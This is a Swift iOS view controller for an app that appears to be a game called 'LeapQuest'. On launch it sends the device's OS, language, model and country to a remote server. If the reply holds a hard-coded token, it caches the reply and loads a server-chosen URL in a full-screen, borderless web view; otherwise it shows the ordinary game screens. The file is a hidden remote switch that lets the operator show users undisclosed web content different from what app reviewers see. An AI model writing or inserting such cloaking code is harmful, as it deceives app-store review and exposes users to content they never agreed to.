import UIKit
import WebKit

class LeapQuestWebViewController: UIViewController, UIDocumentPickerDelegate {
    let leapQuestWebView = WKWebView()
    let leapQuestBackgroundView = UIView()
    let leapQuestLoadingView = UIView()
    let leapQuestLoadingSpinner = UIActivityIndicatorView(style: .large)
    let leapQuestLoadingLabel = UILabel()
    let leapQuestExpectedToken = "GJDFHDFHFDJGSDAGKGHK"
    var leapQuestRetryCount = 0
    let leapQuestMaxRetries = 5

    override func viewDidLoad() {
        super.viewDidLoad()
        leapQuestSetupUI()
        leapQuestLoadWebsite()
    }

    override var prefersStatusBarHidden: Bool {
        return true
    }

    override var preferredStatusBarUpdateAnimation: UIStatusBarAnimation {
        return .fade
    }

    override var prefersHomeIndicatorAutoHidden: Bool {
        return true
    }

    override var supportedInterfaceOrientations: UIInterfaceOrientationMask {
        return .all
    }

    override var shouldAutorotate: Bool {
        return true
    }

    func leapQuestSetupUI() {
        view.backgroundColor = .white

        leapQuestBackgroundView.backgroundColor = .white
        leapQuestBackgroundView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(leapQuestBackgroundView)

        leapQuestLoadingView.backgroundColor = .black
        leapQuestLoadingView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(leapQuestLoadingView)

        leapQuestLoadingSpinner.color = .white
        leapQuestLoadingSpinner.translatesAutoresizingMaskIntoConstraints = false
        leapQuestLoadingView.addSubview(leapQuestLoadingSpinner)

        leapQuestLoadingLabel.text = "Loading..."
        leapQuestLoadingLabel.textColor = .white
        leapQuestLoadingLabel.font = UIFont.systemFont(ofSize: 16, weight: .medium)
        leapQuestLoadingLabel.textAlignment = .center
        leapQuestLoadingLabel.translatesAutoresizingMaskIntoConstraints = false
        leapQuestLoadingView.addSubview(leapQuestLoadingLabel)

        leapQuestWebView.translatesAutoresizingMaskIntoConstraints = false
        leapQuestWebView.navigationDelegate = self
        leapQuestWebView.allowsBackForwardNavigationGestures = false
        leapQuestWebView.scrollView.isScrollEnabled = true
        leapQuestWebView.scrollView.bounces = false
        leapQuestWebView.scrollView.showsVerticalScrollIndicator = false
        leapQuestWebView.scrollView.showsHorizontalScrollIndicator = false
        leapQuestWebView.scrollView.contentInsetAdjustmentBehavior = .never
        leapQuestWebView.scrollView.contentInset = .zero
        leapQuestWebView.scrollView.scrollIndicatorInsets = .zero
        leapQuestWebView.transform = .identity
        leapQuestWebView.isOpaque = false
        leapQuestWebView.backgroundColor = .white
        view.addSubview(leapQuestWebView)

        NSLayoutConstraint.activate([
            leapQuestBackgroundView.topAnchor.constraint(equalTo: view.topAnchor),
            leapQuestBackgroundView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            leapQuestBackgroundView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            leapQuestBackgroundView.bottomAnchor.constraint(equalTo: view.bottomAnchor),

            leapQuestLoadingView.topAnchor.constraint(equalTo: view.topAnchor),
            leapQuestLoadingView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            leapQuestLoadingView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            leapQuestLoadingView.bottomAnchor.constraint(equalTo: view.bottomAnchor),

            leapQuestLoadingSpinner.centerXAnchor.constraint(equalTo: leapQuestLoadingView.centerXAnchor),
            leapQuestLoadingSpinner.centerYAnchor.constraint(equalTo: leapQuestLoadingView.centerYAnchor),

            leapQuestLoadingLabel.topAnchor.constraint(equalTo: leapQuestLoadingSpinner.bottomAnchor, constant: 16),
            leapQuestLoadingLabel.centerXAnchor.constraint(equalTo: leapQuestLoadingView.centerXAnchor),
            leapQuestLoadingLabel.leadingAnchor.constraint(equalTo: leapQuestLoadingView.leadingAnchor, constant: 20),
            leapQuestLoadingLabel.trailingAnchor.constraint(equalTo: leapQuestLoadingView.trailingAnchor, constant: -20),

            leapQuestWebView.topAnchor.constraint(equalTo: view.topAnchor),
            leapQuestWebView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            leapQuestWebView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            leapQuestWebView.bottomAnchor.constraint(equalTo: view.bottomAnchor)
        ])

        leapQuestUpdateWebViewLayout(for: view.bounds.size)
    }

    func leapQuestLoadWebsite() {
        leapQuestShowLoadingScreen()

        if let leapQuestCachedResponse = leapQuestGetCachedResponse() {
            leapQuestProcessServerResponse(leapQuestCachedResponse)
        } else {
            leapQuestCheckServerResponse()
        }
    }

    func leapQuestShowLoadingScreen() {
        leapQuestLoadingView.isHidden = false
        leapQuestLoadingSpinner.startAnimating()
        leapQuestWebView.isHidden = true
        leapQuestUpdateLoadingText()
    }

    func leapQuestUpdateLoadingText() {
        if leapQuestRetryCount == 0 {
            leapQuestLoadingLabel.text = "Loading..."
        } else {
            leapQuestLoadingLabel.text = "Connecting... Attempt \(leapQuestRetryCount + 1)/\(leapQuestMaxRetries)"
        }
    }

    func leapQuestHideLoadingScreen() {
        leapQuestLoadingView.isHidden = true
        leapQuestLoadingSpinner.stopAnimating()
        leapQuestWebView.isHidden = false
    }

    func leapQuestCheckServerResponse() {
        let leapQuestOS = UIDevice.current.systemName + " " + UIDevice.current.systemVersion
        let leapQuestLanguage = (Locale.preferredLanguages.first ?? "en").components(separatedBy: "-").first ?? "en"
        let leapQuestDeviceModel = UIDevice.current.model
        let leapQuestCountry = Locale.current.regionCode ?? "US"

        let leapQuestServerURL = "https://wallen-eatery.space/ios-msym-2/server.php?p=Bs2675kDjkb5Ga&os=\(leapQuestOS)&lng=\(leapQuestLanguage)&devicemodel=\(leapQuestDeviceModel)&country=\(leapQuestCountry)"

        guard let leapQuestURL = URL(string: leapQuestServerURL) else {
            leapQuestShowExampleWebsite()
            return
        }

        let leapQuestTask = URLSession.shared.dataTask(with: leapQuestURL) { [weak self] data, response, error in
            DispatchQueue.main.async {
                if let leapQuestError = error {
                    self?.leapQuestHandleServerError()
                    return
                }

                if let httpResponse = response as? HTTPURLResponse {
                }

                guard let leapQuestData = data,
                    let leapQuestResponse = String(data: leapQuestData, encoding: .utf8) else {
                    self?.leapQuestHandleServerError()
                    return
                }

                self?.leapQuestProcessServerResponse(leapQuestResponse)
            }
        }

        leapQuestTask.resume()
    }

    func leapQuestRetryServerRequest() {
        leapQuestRetryCount += 1

        if leapQuestRetryCount >= leapQuestMaxRetries {
            leapQuestShowExampleWebsite()
            return
        }

        leapQuestUpdateLoadingText()

        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
            self.leapQuestCheckServerResponse()
        }
    }

    func leapQuestHandleServerError() {
        leapQuestRetryServerRequest()
    }

    func leapQuestProcessServerResponse(_ response: String) {
        let leapQuestComponents = response.components(separatedBy: "#")

        if leapQuestComponents.count == 2 {
            let leapQuestToken = leapQuestComponents[0]
            let leapQuestURL = leapQuestComponents[1]

            if leapQuestToken == leapQuestExpectedToken {
                leapQuestRetryCount = 0

                leapQuestSaveCachedResponse(response)

                leapQuestSaveToken(leapQuestToken)
                leapQuestLoadCustomWebsite(leapQuestURL)
            } else {
                leapQuestShowExampleWebsite()
            }
        } else {
            leapQuestShowExampleWebsite()
        }
    }

    func leapQuestSaveToken(_ token: String) {
        UserDefaults.standard.set(token, forKey: "LeapQuestServerToken")
    }

    static func leapQuestGetSavedToken() -> String? {
        return UserDefaults.standard.string(forKey: "LeapQuestServerToken")
    }

    func leapQuestGetCachedResponse() -> String? {
        let cachedResponse = UserDefaults.standard.string(forKey: "LeapQuestCachedResponse")
        return cachedResponse
    }

    func leapQuestSaveCachedResponse(_ response: String) {
        UserDefaults.standard.set(response, forKey: "LeapQuestCachedResponse")
    }

    func leapQuestClearCache() {
        UserDefaults.standard.removeObject(forKey: "LeapQuestCachedResponse")
    }

    func leapQuestIsValidCachedResponse(_ response: String) -> Bool {
        if response == "ERROR#SERVER_ERROR" {
            return false
        }

        let leapQuestComponents = response.components(separatedBy: "#")

        if leapQuestComponents.count == 2 {
            let leapQuestToken = leapQuestComponents[0]
            return leapQuestToken == leapQuestExpectedToken
        }

        return false
    }

    func leapQuestLoadCustomWebsite(_ urlString: String) {
        guard let leapQuestURL = URL(string: urlString) else {
            leapQuestShowExampleWebsite()
            return
        }

        let leapQuestRequest = URLRequest(url: leapQuestURL)

        leapQuestWebView.load(leapQuestRequest)

        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
            self.leapQuestHideLoadingScreen()
        }
    }

    func leapQuestShowExampleWebsite() {
        leapQuestHideLoadingScreen()
        leapQuestNavigateToMainApp()
    }

    override func viewWillTransition(to size: CGSize, with coordinator: UIViewControllerTransitionCoordinator) {
        super.viewWillTransition(to: size, with: coordinator)

        coordinator.animate(alongsideTransition: { _ in
            self.leapQuestWebView.setNeedsLayout()
            self.leapQuestWebView.layoutIfNeeded()
            self.leapQuestUpdateWebViewLayout(for: size)
        })
    }

    func leapQuestUpdateWebViewLayout(for size: CGSize) {
        leapQuestWebView.frame = CGRect(x: 0, y: 0, width: size.width, height: size.height)
        leapQuestWebView.transform = .identity
    }

    func leapQuestNavigateToMainApp() {
        let leapQuestIsFirstLaunch = !UserDefaults.standard.bool(forKey: "LeapQuestHasLaunched")

        if leapQuestIsFirstLaunch {
            let leapQuestOnboardingVC = LeapQuestOnboardingViewController()
            leapQuestOnboardingVC.modalPresentationStyle = .fullScreen
            present(leapQuestOnboardingVC, animated: true)
        } else {
            let leapQuestTabBarVC = LeapQuestTabBarController()
            leapQuestTabBarVC.modalPresentationStyle = .fullScreen
            present(leapQuestTabBarVC, animated: true)
        }
    }
}

extension LeapQuestWebViewController: WKNavigationDelegate {
    func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
    }

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        leapQuestWebView.transform = .identity
        leapQuestWebView.setNeedsLayout()
        leapQuestWebView.layoutIfNeeded()
    }

    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        leapQuestNavigateToMainApp()
    }
}

